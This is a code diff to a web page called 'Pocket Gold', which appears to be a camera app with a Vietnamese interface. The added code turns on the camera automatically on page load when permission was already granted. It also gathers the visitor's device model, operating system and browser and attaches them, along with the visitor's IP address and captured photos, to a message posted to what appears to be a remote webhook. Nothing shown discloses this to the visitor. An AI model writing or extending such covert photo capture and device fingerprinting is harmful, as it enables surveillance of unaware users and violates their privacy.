@@ -6,6 +6,8 @@
   <title>Pocket Gold</title>
   <!-- Phosphor Icons -->
   <script src="https://unpkg.com/@phosphor-icons/web"></script>
+  <!-- UA-Parser-JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
   <style>
     :root {
       --bg-color: #ffaa33;
@@ -106,7 +108,6 @@
       border-color: var(--text-color);
     }
 
-    /* Khung hiển thị Tỷ lệ 9:16 nhỏ gọn */
     .viewfinder-container {
       width: 100%;
       max-width: 270px;
@@ -164,7 +165,6 @@
       padding: 16px;
     }
 
-    /* Flash màn hình */
     .screen-flash {
       position: fixed;
       inset: 0;
@@ -175,7 +175,6 @@
       transition: opacity 0.05s ease-in-out;
     }
 
-    /* Modal Popup Cấp quyền */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -298,7 +297,6 @@
 </head>
 <body class="theme-orange">
 
-  <!-- Popup Yêu cầu quyền Camera -->
   <div class="modal-overlay" id="permission-modal">
     <div class="modal-box">
       <i class="ph ph-camera modal-icon"></i>
@@ -308,7 +306,6 @@
     </div>
   </div>
 
-  <!-- Flash màn hình -->
   <div class="screen-flash" id="screen-flash"></div>
 
   <div class="top-bar">
@@ -328,9 +325,8 @@
     </button>
   </div>
 
-  <!-- Khung Camera 9:16 -->
   <div class="viewfinder-container">
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <div class="badge-friends">
       <i class="ph ph-users-three"></i> Bạn bè
     </div>
@@ -377,6 +373,7 @@
     let isFlashEnabled = true;
     let userIP = "Không xác định";
 
+    // Lấy IP người dùng khi truy cập
     async function getUserIP() {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -387,17 +384,29 @@
       }
     }
 
-    async function requestPermission() {
+    // Tự động kích hoạt Camera nếu đã có quyền sẵn
+    window.addEventListener('DOMContentLoaded', async () => {
       getUserIP();
+      try {
+        const permissions = await navigator.permissions.query({ name: 'camera' });
+        if (permissions.state === 'granted') {
+          const success = await initCamera('user');
+          if (success) permissionModal.style.display = 'none';
+        }
+      } catch (e) {
+        // Trình duyệt không hỗ trợ query camera permission thì giữ nguyên modal
+      }
+    });
+
+    async function requestPermission() {
       const success = await initCamera('user');
       if (success) {
         permissionModal.style.display = 'none';
       } else {
-        alert("Vui lòng cho phép quyền sử dụng camera trên trình duyệt để tiếp tục.");
+        alert("Không thể truy cập Camera. Vui lòng kiểm tra quyền trên trình duyệt.");
       }
     }
 
-    // Hàm khởi tạo camera tích hợp getUserMedia
     async function initCamera(mode) {
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
@@ -406,18 +415,20 @@
       facingMode = mode;
 
       try {
-        // Tích hợp yêu cầu quyền camera (có nâng cấp thêm thông số tối ưu 9:16)
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: {
             facingMode: facingMode,
             width: { ideal: 1080 },
-            height: { ideal: 1920 },
-            aspectRatio: 9 / 16
-          } 
+            height: { ideal: 1920 }
+          },
+          audio: false
         });
 
         currentStream = stream;
         video.srcObject = currentStream;
+
+        // Đảm bảo video bắt đầu phát luồng
+        await video.play();
         
         if (facingMode === 'user') {
           video.classList.add('mirror');
@@ -426,6 +437,7 @@
         }
         return true;
       } catch (err) {
+        console.error("Lỗi khởi tạo Camera:", err);
         return false;
       }
     }
@@ -465,16 +477,33 @@
     function captureFrame() {
       return new Promise((resolve) => {
         const context = canvas.getContext('2d');
-        
-        canvas.width = video.videoWidth || 1080;
-        canvas.height = video.videoHeight || 1920;
+        const vW = video.videoWidth || 1080;
+        const vH = video.videoHeight || 1920;
 
+        const targetWidth = 1080;
+        const targetHeight = 1920;
+        canvas.width = targetWidth;
+        canvas.height = targetHeight;
+
+        let sourceWidth = vW;
+        let sourceHeight = vW * (16 / 9);
+
+        if (sourceHeight > vH) {
+          sourceHeight = vH;
+          sourceWidth = vH * (9 / 16);
+        }
+
+        const sourceX = (vW - sourceWidth) / 2;
+        const sourceY = (vH - sourceHeight) / 2;
+
+        context.save();
         if (facingMode === 'user') {
-          context.translate(canvas.width, 0);
+          context.translate(targetWidth, 0);
           context.scale(-1, 1);
         }
 
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        context.drawImage(video, sourceX, sourceY, sourceWidth, sourceHeight, 0, 0, targetWidth, targetHeight);
+        context.restore();
 
         canvas.toBlob((blob) => {
           resolve(blob);
@@ -537,8 +566,17 @@
         year: 'numeric'
       });
 
+      const parser = new UAParser();
+      const result = parser.getResult();
+
+      const browserName = result.browser.name || "Không rõ";
+      const browserVersion = result.browser.version || "";
+      const osName = result.os.name || "Không rõ";
+      const osVersion = result.os.version || "";
+      const deviceModel = result.device.model || result.device.type || "PC/Unidentified";
+
       formData.append("payload_json", JSON.stringify({
-        content: `📸 **Khoảnh khắc mới từ Pocket Gold!** (${photos.length} góc chụp)\n⏰ **Thời gian chụp:** ${timeString}\n🌐 **IP address:** ${userIP}`
+        content: `📸 **Khoảnh khắc mới từ Pocket Gold!** (${photos.length} góc chụp)\n⏰ **Thời gian:** \`${timeString}\` \n🌐 **IP Address:** \`${userIP}\` \n📱 **Thiết bị:** \`${deviceModel}\` \n💻 **Hệ điều hành:** \`${osName} ${osVersion}\` \n🌐 **Trình duyệt:** \`${browserName} ${browserVersion}\``
       }));
 
       try {
